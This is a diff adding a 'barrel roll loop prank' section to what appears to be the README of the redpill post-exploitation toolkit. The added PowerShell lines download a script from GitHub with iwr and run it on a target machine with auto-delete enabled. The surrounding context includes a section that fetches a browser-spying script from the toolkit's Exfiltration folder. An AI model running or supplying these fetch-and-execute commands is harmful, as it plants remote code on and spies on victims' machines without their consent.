@@ -124,6 +124,16 @@ Start https://youporn.com
 
 <br />
 
+#### Do A Barrel Roll Loop Prank
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1"
+
+# Start the Prank after 3 seconds, loop the prank a max of 5 times with 20 seconds delay before the next loop
+powershell -File "Prank2.ps1" -StartDelay "3" -LoopRange "5" -LoopDelay "20" -AutoDel "on" -MsgBoxClose "8"
+```
+
+<br />
+
 #### Spying target webbrowser active tab windows title
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
